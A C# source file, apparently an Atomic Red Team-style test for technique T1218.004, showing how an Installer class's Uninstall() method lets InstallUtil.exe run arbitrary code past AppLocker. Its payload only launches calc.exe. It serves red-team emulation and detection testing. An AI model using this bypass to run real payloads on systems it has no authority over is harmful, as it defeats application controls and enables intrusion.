// InstallUtil AppLocker Bypass - Atomic Red Team T1218.004
// This assembly will be compiled and executed via InstallUtil.exe
// The Uninstall() method runs arbitrary code when InstallUtil /U is called

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

namespace InstallUtilBypass
{
    [RunInstaller(true)]
    public class AtomicInstaller : Installer
    {
        public override void Install(System.Collections.IDictionary stateSaver)
        {
            base.Install(stateSaver);
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            // Execute calc.exe to demonstrate code execution
            Process.Start("calc.exe");
            Console.WriteLine("[+] NEBULA InstallUtil Bypass - Code Executed!");
        }
    }
}

